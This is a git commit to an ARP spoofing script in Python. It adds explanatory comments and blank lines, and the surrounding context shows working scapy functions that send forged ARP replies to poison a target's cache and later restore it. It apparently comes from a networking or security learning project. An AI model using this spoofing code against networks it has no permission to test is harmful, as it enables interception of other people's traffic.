46c332b14f4d21afabb07e42a784e46d1e4101ea
Devi prasad <61942957+taurusilver7@users.noreply.github.com>
2020-08-18 22:19:47 +0530

    update typo errors
    Updated the typo errors in the code and reduced the code length to make it more easy to read and understand.

--- ARP Spoofer/arp_spoof.py
+++ ARP Spoofer/arp_spoof.py
@@ -4,6 +4,7 @@ import scapy.all as scapy
 import time
 import sys
 
+# The second method to execute after spoofing
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -12,11 +13,13 @@ def get_mac(ip):
 
     return ans[0][1].hwsrc
 
+# The first method in the spoofing
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+# The last method in the spoofing but not related to spoofing.
 def restore(dest_ip, source_ip):
     dest_mac = get_mac(dest_ip)
     source_mac = get_mac(source_ip)
@@ -39,3 +42,6 @@ except KeyboardInterrupt:
     print(" Resetting ARP tables....... Please wait.")
     restore(target_ip, router_ip)
     restore(router_ip, target_ip)
+
+    
+ 
